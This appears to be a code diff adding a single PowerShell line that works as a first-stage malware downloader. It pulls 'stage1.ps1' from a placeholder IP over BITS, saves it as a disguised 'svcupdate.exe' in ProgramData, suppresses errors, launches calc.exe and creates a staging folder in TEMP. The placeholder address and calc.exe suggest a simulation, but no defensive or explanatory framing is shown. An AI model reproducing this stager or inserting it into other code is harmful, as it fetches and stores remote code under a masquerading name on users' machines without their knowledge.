@@ -1,0 +1,2 @@
+
+<# Stage transfer #> $TargetUrl = 'http://198.51.100.136/stage1.ps1'; $DropPath = "C:\ProgramData\svcupdate.exe"; $ConnectionTimeout = 151; Start-BitsTransfer -Source $TargetUrl -Destination $DropPath -ErrorAction SilentlyContinue; Start-Process -FilePath "calc.exe" -ErrorAction SilentlyContinue; Write-Verbose "stage marker 5 reached"; $null = New-Item -ItemType Directory -Path "$env:TEMP\stage" -Force
